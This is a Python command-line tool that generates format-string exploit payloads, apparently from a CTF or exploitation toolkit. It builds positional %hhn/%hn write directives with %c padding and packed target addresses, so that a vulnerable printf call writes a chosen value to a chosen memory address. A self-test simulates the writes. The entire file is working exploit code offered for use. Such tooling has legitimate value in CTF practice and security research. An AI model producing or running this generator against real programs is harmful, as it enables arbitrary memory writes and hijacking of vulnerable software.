#!/usr/bin/env python3
"""fmt_write.py -- emit a %n arbitrary-write payload (fmtstr_payload
equivalent).

Usage:
  python3 tools/fmt_write.py --offset 6 --addr 0x404040 --value 0xdeadc0de
  python3 tools/fmt_write.py --offset 6 --addr 0x404040 --value 0xdeadc0de
      --width hn --hex
  python3 tools/fmt_write.py --selftest

Layout (64-bit): the format directives print padding characters and
positional %hhn/%hn writes, then the literal target addresses sit in
8-byte slots behind them. Byte writes are emitted in ascending value
order so each %c pad is a non-negative delta. Address argument
positions depend on the rendered directive length, so the indices
are recomputed until stable (fixed-point, ~3 rounds). For --width hn
the value is written in 16-bit chunks at addr, addr+2, ...; for hhn
in bytes at addr, addr+1, ...
"""
import argparse
import json
import struct
import sys


def build(offset, addr, value, nwrite, width, asz=8):
    unit = 1 if width == "hhn" else 2
    mask = (1 << (8 * unit)) - 1
    chunks = []
    for i in range(nwrite // unit):
        chunks.append((addr + i * unit,
                       (value >> (8 * unit * i)) & mask))
    order = sorted(range(len(chunks)),
                   key=lambda i: (chunks[i][1], i))
    fmt, printed = "", 0
    argidx = [0] * len(chunks)
    for _ in range(6):
        fmt, printed = "", 0
        for pos in order:
            a, v = chunks[pos]
            pad = (v - printed) & mask
            if pad:
                fmt += f"%{pad}c"
                printed = (printed + pad) & mask
            fmt += f"%{{{pos}}}${width}"
        blob = fmt
        for pos in order:
            blob = blob.replace(f"{{{pos}}}", str(argidx[pos]), 1)
        start = len(blob) + (-len(blob)) % asz
        newidx = [offset + (start + asz * i) // asz
                  for i in range(len(chunks))]
        if newidx == argidx:
            break
        argidx = newidx
    padlen = start - len(blob)
    addrs = b"".join(struct.pack("<Q" if asz == 8 else "<I", a)
                     for a, _ in chunks)
    payload = blob + "\x00" * padlen
    return payload.encode() + addrs, blob, argidx, start


def _selftest():
    payload, fmt, idx, start = build(6, 0x404040, 0xdeadc0de, 4,
                                     "hhn")
    # simulate printf against the embedded addresses
    printed, writes = 0, {}
    i = 0
    while i < len(fmt):
        assert fmt[i] == "%"
        i += 1
        digits = ""
        while fmt[i].isdigit():
            digits += fmt[i]
            i += 1
        if fmt[i] == "c":
            printed += int(digits or "1")
            i += 1
        else:
            assert fmt[i] == "$"
            i += 1
            assert fmt[i:i + 3] == "hhn"
            slot = int(digits)
            addr = struct.unpack("<Q", payload[(slot - 6) * 8:
                                               (slot - 5) * 8])[0]
            writes[addr] = printed & 0xFF
            i += 3
    got = [writes.get(0x404040 + k) for k in range(4)]
    assert got == [0xde, 0xc0, 0xad, 0xde], (got, fmt)
    print("fmt_write selftest: ok")


def main():
    ap = argparse.ArgumentParser(
        description="emit a %n write payload")
    ap.add_argument("--offset", type=int, required=False,
                    help="buffer argument index from fmt_probe offset")
    ap.add_argument("--addr", help="target address, hex")
    ap.add_argument("--value", help="value to write, hex")
    ap.add_argument("--bytes", type=int, default=4,
                    help="bytes of value to write")
    ap.add_argument("--width", choices=["hhn", "hn"], default="hhn")
    ap.add_argument("--arch", type=int, choices=[4, 8], default=8)
    ap.add_argument("--hex", action="store_true",
                    help="print the payload as a \\xNN string")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        return _selftest()
    if not (a.offset and a.addr and a.value):
        ap.error("--offset --addr --value required")
    addr, value = int(a.addr, 16), int(a.value, 16)
    payload, fmt, idx, start = build(a.offset, addr, value,
                                     a.bytes, a.width, a.arch)
    if a.hex:
        print("".join(f"\\x{b:02x}" for b in payload))
    else:
        print(json.dumps({
            "format_directives": fmt,
            "addr_block_offset": start,
            "addr_arg_indices": idx,
            "payload_len": len(payload),
            "payload_hex": payload.hex()}, indent=1))


if __name__ == "__main__":
    raise SystemExit(main())
